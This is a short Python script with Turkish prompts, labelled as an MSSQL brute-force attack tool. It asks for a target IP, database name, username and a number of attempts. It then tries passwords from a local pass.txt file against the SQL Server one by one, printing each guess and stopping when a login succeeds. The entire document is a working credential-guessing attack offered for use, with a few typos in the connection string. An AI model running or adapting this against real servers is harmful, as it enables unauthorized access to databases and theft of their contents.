import io
import pypyodbc

def final(server,db,usr,pwd):
    ip=server
    database=db
    username=usr
    sifre1=[]
    sayi=0
    try:
        sifre =io.open("pass.txt","r",encoding="UTF-8")
    except FileNotFoundError:
        print("Lütfen Uygulamaya 'pass.txt' dosyanızı Ekleyiniz!...")
        exit()
    for s in sifre:
        sifre1.append(s)
    for m in sifre1[:pwd]:
        sayi+=1
        print(f"Denenen Şifre: {m}Denenen Şifre Sayısı: {sayi}")
        passwd=m.strip("\n")
        baglanti = ('Driver={SQL Server};Server='+ip+';Datebase='+database+';UID='+username+';PWD='+passwd+";CONNECT TIMEONT=1")
        try:
            db=pypyodbc.connect(baglanti)
            if db.connected==True:
                print("Bağlantı Başarılı")
                break
            else:
                continue
        except pypyodbc.DatabaseError:
            print("Bağlantı Başarısız")
            print("#".center(141,"#"))

while True:
    print("mssql Brute Force Saldırısı".center(142,"*"))
    secim=int(input("Saldırı İçin: 1 Çıkış İçin: 2 Tuşuna Basın\n"))
    if secim==2:
        break
    else:
        if secim==1:
           ip=(str(input("ip Addresi Giriniz: ")))
           database=(str(input("Veritabanı Adını Giriniz: ")))
           username=(str(input("Kullanıcı Adı Giriniz: ")))
           password=(int(input("Denenecek Şifre Sayısını Giriniz: ")))
           final(ip,database,username,password)
           break
        else:
            print("Hatalı Tuş")
